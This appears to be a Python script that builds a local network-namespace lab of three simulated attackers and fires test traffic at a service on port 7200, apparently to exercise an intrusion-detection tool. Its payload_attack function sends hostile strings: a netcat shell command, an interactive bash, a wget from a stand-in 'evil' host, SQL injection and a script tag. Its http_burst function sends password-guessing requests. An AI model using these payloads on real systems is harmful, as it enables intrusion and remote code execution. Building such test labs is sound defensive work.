import subprocess
import json


ATTACKERS = [
    {
        "ns": "aegis_attacker1",
        "veth_host": "veth1-host",
        "veth_ns": "veth1-ns",
        "host_ip": "10.200.1.1/24",
        "ns_ip": "10.200.1.2/24",
        "ns_ip_plain": "10.200.1.2"
    },
    {
        "ns": "aegis_attacker2",
        "veth_host": "veth2-host",
        "veth_ns": "veth2-ns",
        "host_ip": "10.200.2.1/24",
        "ns_ip": "10.200.2.2/24",
        "ns_ip_plain": "10.200.2.2"
    },
    {
        "ns": "aegis_attacker3",
        "veth_host": "veth3-host",
        "veth_ns": "veth3-ns",
        "host_ip": "10.200.3.1/24",
        "ns_ip": "10.200.3.2/24",
        "ns_ip_plain": "10.200.3.2"
    }
]


def run(cmd, check=False):
    result = subprocess.run(
        cmd,
        capture_output=True,
        text=True
    )

    if check and result.returncode != 0:
        raise RuntimeError(
            f"Command failed: {' '.join(cmd)}\n"
            f"STDOUT: {result.stdout}\n"
            f"STDERR: {result.stderr}"
        )

    return result


def namespace_exists(ns_name):
    result = run(["sudo", "ip", "netns", "list"])
    return ns_name in result.stdout


def interface_exists(iface_name):
    result = run(["ip", "link", "show", iface_name])
    return result.returncode == 0


def setup_lab():
    messages = []

    for attacker in ATTACKERS:
        ns = attacker["ns"]
        veth_host = attacker["veth_host"]
        veth_ns = attacker["veth_ns"]
        host_ip = attacker["host_ip"]
        ns_ip = attacker["ns_ip"]

        try:
            if not namespace_exists(ns):
                run(["sudo", "ip", "netns", "add", ns], check=True)
                messages.append(f"Created namespace: {ns}")
            else:
                messages.append(f"Namespace already exists: {ns}")

            if not interface_exists(veth_host):
                run([
                    "sudo", "ip", "link", "add",
                    veth_host, "type", "veth", "peer", "name", veth_ns
                ], check=True)
                messages.append(f"Created veth pair: {veth_host} <-> {veth_ns}")
            else:
                messages.append(f"Host interface already exists: {veth_host}")

            run(["sudo", "ip", "link", "set", veth_ns, "netns", ns], check=False)

            run(["sudo", "ip", "addr", "flush", "dev", veth_host], check=False)
            run(["sudo", "ip", "addr", "add", host_ip, "dev", veth_host], check=False)
            run(["sudo", "ip", "link", "set", veth_host, "up"], check=False)

            run(["sudo", "ip", "netns", "exec", ns, "ip", "addr", "flush", "dev", veth_ns], check=False)
            run(["sudo", "ip", "netns", "exec", ns, "ip", "addr", "add", ns_ip, "dev", veth_ns], check=False)
            run(["sudo", "ip", "netns", "exec", ns, "ip", "link", "set", veth_ns, "up"], check=False)
            run(["sudo", "ip", "netns", "exec", ns, "ip", "link", "set", "lo", "up"], check=False)

            messages.append(f"Configured {ns} with {ns_ip}")

        except Exception as e:
            messages.append(f"ERROR setting up {ns}: {e}")

    return {
        "status": "ok",
        "messages": messages
    }


def destroy_lab():
    messages = []

    for attacker in ATTACKERS:
        ns = attacker["ns"]
        veth_host = attacker["veth_host"]

        try:
            if namespace_exists(ns):
                run(["sudo", "ip", "netns", "delete", ns], check=False)
                messages.append(f"Deleted namespace: {ns}")
            else:
                messages.append(f"Namespace not present: {ns}")

            if interface_exists(veth_host):
                run(["sudo", "ip", "link", "delete", veth_host], check=False)
                messages.append(f"Deleted host interface: {veth_host}")
            else:
                messages.append(f"Host interface not present: {veth_host}")

        except Exception as e:
            messages.append(f"ERROR destroying {ns}: {e}")

    return {
        "status": "ok",
        "messages": messages
    }


def lab_status():
    status = []

    for attacker in ATTACKERS:
        ns = attacker["ns"]
        veth_host = attacker["veth_host"]

        ns_exists = namespace_exists(ns)
        host_if_exists = interface_exists(veth_host)

        status.append({
            "namespace": ns,
            "namespace_exists": ns_exists,
            "host_interface": veth_host,
            "host_interface_exists": host_if_exists,
            "attacker_ip": attacker["ns_ip_plain"]
        })

    return {
        "status": "ok",
        "attackers": status
    }


def ping_host(attacker_index=0):
    attacker = ATTACKERS[attacker_index]
    ns = attacker["ns"]
    target = attacker["host_ip"].split("/")[0]

    return run([
        "sudo", "ip", "netns", "exec", ns,
        "ping", "-c", "4", target
    ])


def http_burst(attacker_index=0, target_url="http://10.200.1.1:7200"):
    attacker = ATTACKERS[attacker_index]
    ns = attacker["ns"]

    cmd = (
        f"for i in $(seq 1 20); do "
        f"curl -s '{target_url}/' >/dev/null 2>&1; "
        f"curl -s '{target_url}/login?user=admin&pass=guess{i}' >/dev/null 2>&1; "
        f"curl -s '{target_url}/admin?token=badtoken{i}' >/dev/null 2>&1; "
        f"curl -s '{target_url}/status' >/dev/null 2>&1; "
        f"sleep 0.05; "
        f"done"
    )

    return run([
        "sudo", "ip", "netns", "exec", ns,
        "bash", "-c", cmd
    ])


def payload_attack(attacker_index=0, target_url="http://10.200.1.1:7200"):
    attacker = ATTACKERS[attacker_index]
    ns = attacker["ns"]

    cmd = (
        f"curl -s '{target_url}/cmd?cmd=nc -e /bin/sh' >/dev/null 2>&1; "
        f"curl -s '{target_url}/cmd?cmd=/bin/bash -i' >/dev/null 2>&1; "
        f"curl -s '{target_url}/cmd?cmd=wget http://evil/payload.sh' >/dev/null 2>&1; "
        f"curl -s -X POST '{target_url}/upload' --data 'UNION SELECT * FROM users; <script>alert(1)</script>' >/dev/null 2>&1"
    )

    return run([
        "sudo", "ip", "netns", "exec", ns,
        "bash", "-c", cmd
    ])


def mixed_attack_all(targets=None):
    if targets is None:
        targets = [
            "http://10.200.1.1:7200",
            "http://10.200.2.1:7200",
            "http://10.200.3.1:7200"
        ]

    outputs = []

    for i, target in enumerate(targets):
        try:
            http_burst(i, target)
            payload_attack(i, target)
            outputs.append(f"Attacker {i+1} attacked {target}")
        except Exception as e:
            outputs.append(f"Attacker {i+1} failed: {e}")

    return {
        "status": "ok",
        "messages": outputs
    }


if __name__ == "__main__":
    print(json.dumps(lab_status(), indent=2))
